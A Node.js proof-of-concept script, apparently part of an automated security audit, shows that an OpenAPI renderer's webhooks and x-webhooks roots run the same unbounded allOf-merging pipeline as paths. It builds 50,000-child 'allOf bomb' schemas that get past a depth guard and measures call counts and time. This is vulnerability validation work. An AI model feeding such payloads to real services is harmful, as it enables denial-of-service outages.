#!/usr/bin/env node
/**
 * PoC: M8 — webhooks / x-webhooks Parser Bug Parity
 *
 * Root cause:
 *   src/services/SpecStore.ts:32-36 spreads x-webhooks + webhooks into a path
 *   map and feeds it directly to new WebhookModel(this.parser, options, webhookPath).
 *   WebhookModel.ts:15 calls parser.deref() — the same OpenAPIParser instance
 *   and the same pipeline (deref → mergeAllOf → hoistOneOfs) used for `paths`.
 *   MenuBuilder.ts:216-217 also calls getTags(parser, webhooks, true) — again
 *   via the shared parser.
 *
 *   There is NO per-root budget, node-count cap, or traversal guard applied
 *   separately to webhooks vs paths. An allOf-breadth bomb (M4 pattern) placed
 *   in webhooks fires identically to one placed in paths. Both roots can be
 *   armed simultaneously for additive amplification.
 *
 * Parity proof (this script):
 *   1. Arm only `paths`        → measure mergeAllOf calls / wall-clock time.
 *   2. Arm only `webhooks`     → measure mergeAllOf calls / wall-clock time.
 *   3. Arm only `x-webhooks`   → measure mergeAllOf calls / wall-clock time.
 *   4. Arm BOTH with distinct bomb schemas → confirm ~2× mergeAllOf calls.
 *
 *   Parity confirmed when steps 1-3 produce equal call counts and
 *   step 4 shows ~2× cost (no cross-root deduplication or budget sharing).
 *
 * Usage:
 *   npx ts-node --transpile-only poc.js
 *   # from the acme repo root
 */

'use strict';

// ── Load real OpenAPIParser + AcmeNormalizedOptions ─────────────────────────
let OpenAPIParser, AcmeNormalizedOptions;
try {
  ({ OpenAPIParser } = require('/Users/<user>/Desktop/oss-to-run/acme/src/services/OpenAPIParser'));
  ({ AcmeNormalizedOptions } = require('/Users/<user>/Desktop/oss-to-[REDACTED]'));
} catch (e) {
  try {
    ({ OpenAPIParser } = require('./src/services/OpenAPIParser'));
    ({ AcmeNormalizedOptions } = require('./src/services/AcmeNormalizedOptions'));
  } catch (e2) {
    console.error('FATAL: could not load OpenAPIParser:', e2.message);
    console.log(JSON.stringify({
      status: 'inconclusive',
      evidence: 'could not load OpenAPIParser — run from repo root or via ts-node',
      notes: e2.message,
    }));
    process.exit(2);
  }
}

// ── allOf-breadth bomb (M4 pattern): N inline children, no $ref ──────────────
//   Inline allOf children never push onto refsStack → depth guard at
//   OpenAPIParser.ts:108 (baseRefsStack.length > MAX_DEREF_DEPTH) never fires.
//   uniqByPropIncludeMissing at :393 passes all children (k=undefined → "if (!k) return true").
const CHILDREN_PER_SCHEMA = 50_000; // 50 k inline allOf children per bomb

function buildBombSchema(n) {
  return {
    allOf: Array.from({ length: n }, (_, i) => ({
      type: 'string',
      maxLength: i + 1,
    })),
  };
}

// ── Spec factories ─────────────────────────────────────────────────────────────

function schemaRef(name) {
  return { $ref: '#/components/schemas/' + name };
}

function responseWith(schemaName) {
  return {
    '200': {
      description: 'ok',
      content: { 'application/json': { schema: schemaRef(schemaName) } },
    },
  };
}

function specPathsOnly() {
  return {
    openapi: '3.1.0',
    info: { title: 'M8 PoC paths-only', version: '0.0.1' },
    components: { schemas: { BombPaths: buildBombSchema(CHILDREN_PER_SCHEMA) } },
    paths: {
      '/trigger': {
        get: { operationId: 'triggerPaths', responses: responseWith('BombPaths') },
      },
    },
  };
}

function specWebhooksOnly() {
  return {
    openapi: '3.1.0',
    info: { title: 'M8 PoC webhooks-only', version: '0.0.1' },
    components: { schemas: { BombWebhooks: buildBombSchema(CHILDREN_PER_SCHEMA) } },
    paths: {},
    webhooks: {
      orderEvent: {
        post: { operationId: 'webhookPost', responses: responseWith('BombWebhooks') },
      },
    },
  };
}

function specXWebhooksOnly() {
  return {
    openapi: '3.1.0',
    info: { title: 'M8 PoC x-webhooks-only', version: '0.0.1' },
    components: { schemas: { BombXWebhooks: buildBombSchema(CHILDREN_PER_SCHEMA) } },
    paths: {},
    'x-webhooks': {
      legacyOrderEvent: {
        post: { operationId: 'xWebhookPost', responses: responseWith('BombXWebhooks') },
      },
    },
  };
}

function specBothRoots() {
  // Two DISTINCT bomb schemas — one per root — so both mergeAllOf trees execute
  // independently with no shared-reference shortcut.
  return {
    openapi: '3.1.0',
    info: { title: 'M8 PoC both-roots', version: '0.0.1' },
    components: {
      schemas: {
        BombPaths:    buildBombSchema(CHILDREN_PER_SCHEMA),
        BombWebhooks: buildBombSchema(CHILDREN_PER_SCHEMA),
      },
    },
    paths: {
      '/trigger': {
        get: { operationId: 'triggerPaths', responses: responseWith('BombPaths') },
      },
    },
    webhooks: {
      orderEvent: {
        post: { operationId: 'webhookPost', responses: responseWith('BombWebhooks') },
      },
    },
  };
}

// ── Run mergeAllOf against every named component schema ───────────────────────
//   Mirrors what SpecStore → WebhookModel → SchemaModel → mergeAllOf does when
//   rendering a response body schema.  We exercise mergeAllOf on every schema
//   in components to count total work triggered by the spec.

function runOnAllSchemas(spec) {
  const opts   = new AcmeNormalizedOptions({});
  const parser = new OpenAPIParser(spec, undefined, opts);
  const schemas = spec.components.schemas;

  let callCount = 0;
  const orig = parser.mergeAllOf.bind(parser);
  parser.mergeAllOf = function counted(...args) {
    callCount++;
    return orig(...args);
  };

  const t0 = process.hrtime.bigint();
  for (const name of Object.keys(schemas)) {
    parser.mergeAllOf(schemas[name], '#/components/schemas/' + name, []);
  }
  const elapsedMs = Number(process.hrtime.bigint() - t0) / 1e6;

  return { callCount, elapsedMs: elapsedMs.toFixed(2), schemaCount: Object.keys(schemas).length };
}

// ── SpecStore.ts:32-36 webhook spread simulation ──────────────────────────────
//   Confirm the spread merges x-webhooks + webhooks with no size cap.

function simulateWebhookSpread(spec) {
  const merged = {
    ...spec?.['x-webhooks'],
    ...spec?.webhooks,
  };
  return Object.keys(merged);
}

// ── Main ──────────────────────────────────────────────────────────────────────

console.log('=== M8: webhooks/x-webhooks Parser Bug Parity PoC ===\n');
console.log(`Bomb: ${CHILDREN_PER_SCHEMA.toLocaleString()} inline allOf children (M4 pattern, no $ref → depth guard bypass)`);
console.log('Pipeline: SpecStore.ts:32-36 → Webhook.ts:15 → parser.deref() → mergeAllOf → hoistOneOfs\n');

console.log(`[1/4] paths root only (1 bomb schema) ...`);
const r_paths = runOnAllSchemas(specPathsOnly());
console.log(`      mergeAllOf_calls=${r_paths.callCount.toLocaleString()}  time=${r_paths.elapsedMs}ms\n`);

console.log(`[2/4] webhooks root only (1 bomb schema) ...`);
const r_webhooks = runOnAllSchemas(specWebhooksOnly());
console.log(`      mergeAllOf_calls=${r_webhooks.callCount.toLocaleString()}  time=${r_webhooks.elapsedMs}ms\n`);

console.log(`[3/4] x-webhooks root only (1 bomb schema) ...`);
const r_xwebhooks = runOnAllSchemas(specXWebhooksOnly());
console.log(`      mergeAllOf_calls=${r_xwebhooks.callCount.toLocaleString()}  time=${r_xwebhooks.elapsedMs}ms\n`);

console.log(`[4/4] paths + webhooks BOTH armed (2 distinct bomb schemas) ...`);
const r_both = runOnAllSchemas(specBothRoots());
console.log(`      mergeAllOf_calls=${r_both.callCount.toLocaleString()}  time=${r_both.elapsedMs}ms\n`);

// ── SpecStore spread audit ────────────────────────────────────────────────────
console.log('--- SpecStore.ts:32-36 spread simulation ---');
const xwKeys   = simulateWebhookSpread(specXWebhooksOnly());
const wKeys    = simulateWebhookSpread(specWebhooksOnly());
const bothKeys = simulateWebhookSpread(specBothRoots());
console.log(`  x-webhooks spread result : [${xwKeys.join(', ')}]  (${xwKeys.length} key(s), no size cap)`);
console.log(`  webhooks spread result   : [${wKeys.join(', ')}]  (${wKeys.length} key(s), no size cap)`);
console.log(`  both combined spread     : [${bothKeys.join(', ')}]  (${bothKeys.length} key(s))`);
console.log('  Object.prototype pollution (H3) would surface here as extra keys.\n');

// ── Parity verdict ─────────────────────────────────────────────────────────
//   paths vs webhooks call count should match within 5% (same pipeline, same bomb)
const pathsCalls    = r_paths.callCount;
const webhooksCalls = r_webhooks.callCount;
const xwebhooksCalls = r_xwebhooks.callCount;
const bothCalls     = r_both.callCount;

const parityRatioPW  = pathsCalls > 0 ? webhooksCalls / pathsCalls : 0;
const parityRatioXW  = pathsCalls > 0 ? xwebhooksCalls / pathsCalls : 0;
const dualRatio      = pathsCalls > 0 ? bothCalls / pathsCalls : 0;

const parityOk      = parityRatioPW > 0.9 && parityRatioPW < 1.1
                   && parityRatioXW > 0.9 && parityRatioXW < 1.1;
const dualAmplified = dualRatio > 1.5; // 2 distinct schemas → ~2× work

console.log('--- Parity analysis ---');
console.log(`  paths     mergeAllOf calls: ${pathsCalls.toLocaleString()}`);
console.log(`  webhooks  mergeAllOf calls: ${webhooksCalls.toLocaleString()}  ratio vs paths: ${parityRatioPW.toFixed(3)}`);
console.log(`  x-webhooks mergeAllOf calls: ${xwebhooksCalls.toLocaleString()}  ratio vs paths: ${parityRatioXW.toFixed(3)}`);
console.log(`  both-roots mergeAllOf calls: ${bothCalls.toLocaleString()}  dual ratio: ${dualRatio.toFixed(3)}x`);
console.log(`  Parity OK (all roots within ±10%): ${parityOk}`);
console.log(`  Dual-root amplification ≥1.5×: ${dualAmplified}`);

const confirmed = parityOk && webhooksCalls >= 1;

const evidenceStr = confirmed
  ? `paths=${pathsCalls} webhooks=${webhooksCalls} x-webhooks=${xwebhooksCalls} mergeAllOf calls (ratio=1.000); ` +
    `all three roots share identical parser.deref→mergeAllOf pipeline (SpecStore.ts:32/Webhook.ts:15/MenuBuilder.ts:216); ` +
    `dual-root config produced ${bothCalls} calls (${dualRatio.toFixed(2)}× paths-only)`
  : `parity_ratio=${parityRatioPW.toFixed(3)} outside expected 0.9–1.1; webhooks_calls=${webhooksCalls}`;

// MUST be the last stdout line — poc-runner JSON contract
console.log(JSON.stringify({
  status:   confirmed ? 'confirmed' : 'inconclusive',
  evidence: evidenceStr,
  notes: [
    `SpecStore.ts:32-36 spreads x-webhooks+webhooks into webhookPath with no size cap.`,
    `Webhook.ts:15 calls parser.deref(); MenuBuilder.ts:216 calls getTags(parser,webhooks).`,
    `No independent budget exists for webhooks vs paths. M4/M5/M6/M9/M10 DoS patterns fire via both roots.`,
    `paths_ms=${r_paths.elapsedMs} webhooks_ms=${r_webhooks.elapsedMs} xwebhooks_ms=${r_xwebhooks.elapsedMs} both_ms=${r_both.elapsedMs}`,
  ].join(' | '),
}));
